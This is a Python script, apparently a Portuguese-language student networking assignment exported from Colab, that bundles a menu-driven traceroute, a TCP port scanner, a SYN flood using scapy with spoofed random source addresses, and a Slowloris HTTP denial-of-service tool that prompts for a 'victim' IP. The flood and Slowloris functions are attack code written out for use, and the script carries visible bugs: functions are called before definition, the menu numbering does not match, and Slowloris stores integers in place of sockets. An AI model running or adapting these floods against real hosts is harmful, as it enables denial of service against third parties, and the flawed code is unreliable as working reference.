# -*- coding: utf-8 -*-
"""Atividade2_topicos_redes.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/16PouJfF-tuV1shwLMFafAoWw7_IZHWfs
"""

#bibliotecas importadas
from scapy.all import *
import socket
import os
import sys
import random
import socket
import time

def menu():
  print("-"*60)
  print("CANIVETE SUÍÇO\nBem vindo. \nAuthors: Kamilla")
  print("-"*60)
  print("Escolha uma das opções abaixo:\n")
  choice = int(input("Ferramentas de análise:\n 1-TRACEROUTE \n 2-PORTSCAN \n \n Ferramentas de ataque:\n 3-SYN Flood \n 5-SLOWLORIS\n\n0-Sair\n"))

  if choice == 1:
    Traceroute_tool()
  elif choice == 2:
    PortScan_tool()
  elif choice == 3:
    SYNFlood_tool()
  elif choice == 4:
    Slowloris_tool()
  elif choice == 0:
    exit()
  else: 
    print("Opção inválida! Tente novamente.")

menu()

#TRACEROUTE

def Traceroute_tool():
  global sr
  os.system("clear")
  print("-"*60)
  print("Bem vindo à ferramenta TRACEROUTE")
  print("-"*60)
  print("INSTRUÇÕES:\n")
  print("Para utilizar a ferramenta informe o hostname de quem você deseja realizar o TRACEROUTE")
  print("-"*60)
  hostname = input("Digite o host (www.exemplo.com):\n")

  pkt, unans = sr(IP(dst=hostname, ttl=(0,14))/ TCP())

  for sr,rcv in pkt:
    print (sr.ttl, rcv.src)

  final = int(input("\n\nDeseja voltar ao menu?\n1-Sim\n2-Não\n"))
  if final == 1:
    menu()
  else:
    exit()

#PORTSCAN

def PortScan_tool():
	os.system("clear")
	print("-"*60)
	print("Bem vindo à ferramenta PORTSCAN")
	print("-"*60)
	print("INSTRUÇÕES:\n")
	print("Para utilizar a ferramenta, primeiro você deve escolher uma das duas opções abaixo.")
	print("Você pode realizar o PORTSCAN: de um determindo conjunto de portas ou escolhendo qual porta você verificar por vez")
	print("Caso deseje finalizar o processo antes do tempo, pressione Ctrl+c no seu teclado")
	print("-"*60)

	print("\nDeseja realizar qual tipo de portscan?")
	choice = int(input("1-Porta 1 a 65535\n2-Definir quantidade de portas\n"))

	def portScan():
		t_port = int(input("Insira a porta que deseja fazer o portscan:\n"))
		try:
			#família do socket, tipo do socket, nesse caso o STREAM pq vamos nos conectar através do protocolo TCP
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			res = sock.connect((t_ip, t_port))
			print("Port {}: Open".format(t_port))
			sock.close()
		except:
			print("Port {}: Closed".format(t_port))

	#portscan será feito da porta 1 a 65535
	if choice==1:
		t_host = str(input("Insira o host (www.exemplo.com): \n")) #Host alvo
		t_ip = socket.gethostbyname(t_host) #endereço IPv4 do t_host
		print (t_ip) #printa o ip
		n = 65535
		for i in range(n):
			portScan()
		print("Port Scan completo")

	#portscan será feito em portas definidas pelo usuário
	elif choice==2:
		t_host = str(input("Insira o host (www.exemplo.com): \n")) #Host alvo
		t_ip = socket.gethostbyname(t_host) #endereço IPv4 do t_host
		print (t_ip) #printa o ip
		n = int(input("Quantas portas deseja fazer o portscan?\n")) #definindo quantidade de portas a serem scanneadas
		for i in range(n):
			portScan()
		print ("Port Scan completo")
	final = int(input("\n\nDeseja voltar ao menu?\n1-Sim\n2-Não\n"))
	if final == 1:
		menu()

	#default
	else:
		print("Você digitou uma opção inválida!")

#SYN Flood attack

def SYNFlood_tool():

	def randomIP():
		ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
		return ip

	def randInt():
		x = random.randint(1000,9000)
		return x	

	def SYN_Flood(dstIP,dstPort,count):
		total = 0
		print ("Pacotes sendo enviados...")
		for x in range (0,count):
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()

			IP_Packet = IP ()
			IP_Packet.src = randomIP()
			IP_Packet.dst = dstIP

			TCP_Packet = TCP ()	
			TCP_Packet.sport = s_port
			TCP_Packet.dport = dstPort
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			send(IP_Packet/TCP_Packet, verbose=0)
			total+=1
		sys.stdout.write("\nTotal de pacotes enviados: %i\n" % total)
		final = int(input("\n\nDeseja voltar ao menu?\n1-Sim\n2-Não\n"))
		if final == 1:
			menu()


	def info():
		os.system("clear")
		print("-"*60)
		print("Bem vindo à ferramenta SYN Flood")
		print("-"*60)
		print("INSTRUÇÕES:\n")
		print("Para utilizar a ferramenta siga os passos abaixo:")
		print("- Informe o IP da máquina que será a vítima do ataque SYN Flood;")
		print("- Informe a porta que você deseja fazer o ataque;")
		print("- Informe a quantidade de pacotes você deseja enviar.")
		print("-"*60)

		dstIP = input("\nIP alvo: \n")
		dstPort = input("Porta alvo: \n")
		
		return dstIP,int(dstPort)
		

	def main():
		dstIP,dstPort = info()
		counter = input("Quantos pacotes você quer enviar? \n")
		SYN_Flood(dstIP,dstPort,int(counter))
	

	main()

#SLOWLORIS

def Slowloris_tool():
  os.system("clear")
  print("-"*60)
  print("Bem vindo à ferramenta SLOWLORIS")
  print("-"*60)
  print("INSTRUÇÕES:")
  print("Para utilizar a ferramenta você deve ter as seguintes informações:\n -O IP da máquina que será a vítima;")
  print("\n -A porta que receberá os ataques;\n -A quantidade de sockets a serem enviados.")
  print("Caso deseje finalizar o processo antes do tempo, pressione Ctrl+c no seu teclado")
  print("-"*60)

  lista_sockets = []

  #cabeçalho HTTP que vai ser enviado
  headers = [
      "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
      "Accept-language: en-US,en,q=0.5"
  ]

  ip = input("Informe o IP da vítima: \n")
  d_port = int(input("Informe a porta que receberá os ataques: \n"))
  socket_count = int(input("Informe a quantidade de sockets que serão utilizados no ataque: \n"))
  print("Iniciando ataque ao IP: {} com {} sockets.".format(ip, socket_count))

  print("Criando sockets...")
  for i in range(socket_count):
    try:
      print("Criando socket {}".format(i))
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #família do socket, tipo do socket
      sock.settimeout(5)
      sock.connect((ip, d_port)) #conexão com o ip e porta
    except socket.error:
      break
    lista_sockets.append(i) #acrescenta o socket criado ao final da lista de sockets

  print("Configurando os sockets...")
  for sock in lista_sockets:
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for head in headers:
      sock.send(bytes("{}\r\n".format(headers).encode("utf-8")))

  #tentativa de envios dos headers
  try:
    while True:
      print("Enviando keep-alive headers...")
      for sock in lista_sockets:
        try:
          sock.send("X-a: {}\r\n".format(random.randint(1, 5000)))
        #caso algo dê errado o socket vai ser removido e haverá uma tentativa de criar novamente o socket
        except socket.error:
          lista_sockets.remove(sock)
          try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, d_port))
            for sock in lista_sockets:
              sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
              for head in headers:
                sock.send(bytes("{}\r\n".format(headers).encode("utf-8")))
          #se der errado mais uma vez, ele continua o programa
          except socket.error:
            continue
      #tempo em que os headers são enviados periodicamente
      time.sleep(15)
  
  #sair do programa
  except KeyboardInterrupt:
    exit()
    final = int(input("\n\nDeseja voltar ao menu?\n1-Sim\n2-Não\n"))
    if final == 1:
      menu()
